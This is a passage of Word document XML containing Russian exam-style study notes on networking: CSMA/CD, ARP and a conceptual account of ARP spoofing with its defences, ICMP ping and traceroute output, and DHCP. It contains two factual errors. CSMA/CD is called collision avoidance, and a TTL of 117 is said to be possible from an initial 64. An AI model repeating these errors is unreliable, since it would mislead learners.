        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В экзамене могут спросить</w:t>
      </w:r>
      <w:r>
        <w:t>: "Что такое CSMA/CD?" — отвечай, что это механизм избегания коллизий в старых Ethernet-сетях с хабами, но сейчас не актуален из-за свитчей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6.2. ARP (Address Resolution Protocol): IP → MAC</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя есть IP-адрес получателя (например, `192.168.1.1`), но Ethernet работает с MAC-адресами. Как узнать MAC-адрес роутера?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARP (Address Resolution Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол, который преобразует IP-адрес в MAC-адрес.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает ARP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сценарий</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты хочешь отправить пакет на роутер (`192.168.1.1`), но не знаешь его MAC-адрес.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ARP-запрос (broadcast)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Твой компьютер отправляет **широковещательный** (broadcast) Ethernet-кадр:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Destination MAC: `FF:FF:FF:FF:FF:FF` (всем в сети)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Payload: "Кто имеет IP `192.168.1.1`? Ответьте на мой MAC `AA:BB:CC:DD:EE:FF`"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ARP-ответ (unicast)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутер (у которого IP `192.168.1.1`) отвечает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Destination MAC: `AA:BB:CC:DD:EE:FF` (только тебе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Payload: "Это я! Мой MAC-адрес: `11:22:33:44:55:66`"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Кэширование**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Твой компьютер сохраняет эту пару (IP ↔ MAC) в **ARP-таблицу** на несколько минут (обычно 2-10 минут, зависит от ОС).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отправка данных**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Теперь ты можешь отправлять Ethernet-кадры напрямую на MAC `11:22:33:44:55:66`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ARP-таблица: кэш соответствий</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARP-таблица</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ARP cache) — это список соответствий IP ↔ MAC, которые компьютер запомнил.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Посмотреть ARP-таблицу</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux/macOS**: `arp -a` или `ip neigh`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows**: `arp -a`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример вывода</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>? (192.168.1.1) at 11:22:33:44:55:66 [ether] on enp3s0</w:t>
        <w:br/>
        <w:t>? (192.168.1.100) at aa:bb:cc:dd:ee:ff [ether] on enp3s0</w:t>
        <w:br/>
        <w:t>? (192.168.1.50) at &lt;incomplete&gt; on enp3s0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`&lt;incomplete&gt;` — ARP-запрос отправлен, но ответа пока нет (устройство выключено или недоступно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время жизни записи</w:t>
      </w:r>
      <w:r>
        <w:t>: обычно 2-10 минут. После этого запись удаляется, и при следующей отправке пакета ARP-запрос отправляется снова.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ARP-spoofing: атака на доверчивость</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: ARP не использует аутентификацию. Любой может ответить на ARP-запрос, даже если это не его IP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARP-spoofing (ARP poisoning)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это атака типа </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Man-in-the-Middle</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (MitM):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправляет **фальшивые ARP-ответы**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"IP `192.168.1.1` (роутер) — это я! Мой MAC: `AA:AA:AA:AA:AA:AA`"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Твой компьютер обновляет ARP-таблицу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Теперь все пакеты, предназначенные роутеру, идут **хакеру**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер читает трафик и пересылает его роутеру (ты ничего не замечаешь).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Статические ARP-записи** (вручную прописать MAC роутера)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Dynamic ARP Inspection (DAI)** на свитчах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VPN** — шифрование трафика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6.3. ICMP (Internet Control Message Protocol): ping и traceroute</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ICMP (Internet Control Message Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>служебных сообщений</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в IP-сетях. Он не передаёт данные пользователя, а используется для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>диагностики</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>уведомлений об ошибках</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">ICMP работает на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сетевом уровне</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Layer 3), но технически он </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>поверх IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (у IP-пакета `Protocol = 1` означает ICMP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Типы ICMP-сообщений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Тип | Название | Описание | Пример использования |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|----------|----------|---------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Echo Reply | Ответ на ping | `ping google.com` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Destination Unreachable | Получатель недоступен | Порт закрыт, сеть недостижима |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Echo Request | Запрос ping | `ping 8.8.8.8` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Time Exceeded | TTL истёк | `traceroute google.com` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Redirect | Перенаправление маршрута | Роутер предлагает лучший путь |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Ping: проверка доступности хоста</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ping</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это утилита для проверки доступности устройства в сети. Она отправляет ICMP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Echo Request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и ждёт ICMP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Echo Reply</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ping google.com</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PING google.com (142.250.185.46): 56 data bytes</w:t>
        <w:br/>
        <w:t>64 bytes from 142.250.185.46: icmp_seq=0 ttl=117 time=12.3 ms</w:t>
        <w:br/>
        <w:t>64 bytes from 142.250.185.46: icmp_seq=1 ttl=117 time=11.8 ms</w:t>
        <w:br/>
        <w:t>64 bytes from 142.250.185.46: icmp_seq=2 ttl=117 time=12.1 ms</w:t>
        <w:br/>
        <w:br/>
        <w:t>--- google.com ping statistics ---</w:t>
        <w:br/>
        <w:t>3 packets transmitted, 3 packets received, 0.0% packet loss</w:t>
        <w:br/>
        <w:t>round-trip min/avg/max/stddev = 11.8/12.1/12.3/0.2 ms</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расшифровка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`64 bytes` — размер пакета (ICMP-заголовок + данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`icmp_seq=0` — номер пакета (порядок)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ttl=117` — сколько прыжков осталось (изначально было 128 или 64, прошло 11 или 47 роутеров)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`time=12.3 ms` — **RTT (Round-Trip Time)** — время туда и обратно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практический пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Если `ping 192.168.1.1` не работает, значит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Либо роутер выключен</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Либо firewall блокирует ICMP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Либо ты неправильно настроил сеть</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Traceroute: путь пакета через интернет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Traceroute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (в Windows — `tracert`) — это утилита, которая показывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>все роутеры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на пути от тебя до цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляем пакет с **TTL = 1**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Первый роутер уменьшает TTL до 0 → отбрасывает пакет → отправляет ICMP **Time Exceeded**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляем пакет с **TTL = 2**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Второй роутер уменьшает TTL до 0 → отправляет ICMP **Time Exceeded**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>...и так далее, пока не дойдём до цели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>traceroute google.com</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>traceroute to google.com (142.250.185.46), 30 hops max, 60 byte packets</w:t>
        <w:br/>
        <w:t xml:space="preserve"> 1  _gateway (192.168.1.1)  1.234 ms  1.102 ms  1.087 ms</w:t>
        <w:br/>
        <w:t xml:space="preserve"> 2  10.0.0.1 (10.0.0.1)  8.456 ms  8.234 ms  8.123 ms</w:t>
        <w:br/>
        <w:t xml:space="preserve"> 3  * * *</w:t>
        <w:br/>
        <w:t xml:space="preserve"> 4  72.14.238.1 (72.14.238.1)  12.345 ms  12.234 ms  12.123 ms</w:t>
        <w:br/>
        <w:t xml:space="preserve"> 5  142.250.185.46 (142.250.185.46)  13.456 ms  13.234 ms  13.123 ms</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расшифровка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1-й прыжок**: домашний роутер (`192.168.1.1`), задержка ~1 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2-й прыжок**: роутер провайдера (`10.0.0.1`), задержка ~8 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3-й прыжок**: `* * *` — роутер не отвечает на ICMP (заблокирован firewall)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**4-5 прыжки**: роутеры Google</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем это нужно</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Узнать, **где** возникает задержка (у провайдера или у цели)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понять, через какие страны идёт трафик</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6.4. DHCP (Dynamic Host Configuration Protocol): автоматическая настройка сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Когда ты подключаешь ноутбук к Wi-Fi, откуда он знает свой IP-адрес, маску подсети, шлюз и DNS-сервер? Ты же не вводишь это вручную, верно?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP (Dynamic Host Configuration Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол, который автоматически выдаёт устройствам настройки сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где работает</w:t>
      </w:r>
      <w:r>
        <w:t>: На роутере (домашний роутер — это DHCP-сервер).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс получения IP (DORA)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">DHCP использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4 шага</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DORA</w:t>
      </w:r>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Шаг | Сообщение | Кто отправляет | Куда | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|-----------|----------------|------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 1 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP Discover</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Клиент | Broadcast (`255.255.255.255`) | "Есть тут DHCP-серверы? Мне нужен IP!" |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 2 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP Offer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Сервер | Клиент (broadcast или unicast) | "Привет! Могу дать тебе `192.168.1.100`" |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 3 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP Request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Клиент | Broadcast | "Окей, беру `192.168.1.100` у сервера `192.168.1.1`" |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 4 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP Acknowledgment</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Сервер | Клиент | "Подтверждаю! Вот твои настройки" |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему broadcast</w:t>
      </w:r>
      <w:r>
        <w:t>: Клиент ещё не имеет IP-адреса, поэтому не может отправить unicast-пакет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что выдаёт DHCP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Когда сервер отправляет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP Acknowledgment</w:t>
      </w:r>
      <w:r>
        <w:t>, он передаёт:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**IP-адрес** (например, `192.168.1.100`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Маска подсети** (например, `255.255.255.0`)</w:t>
      </w:r>
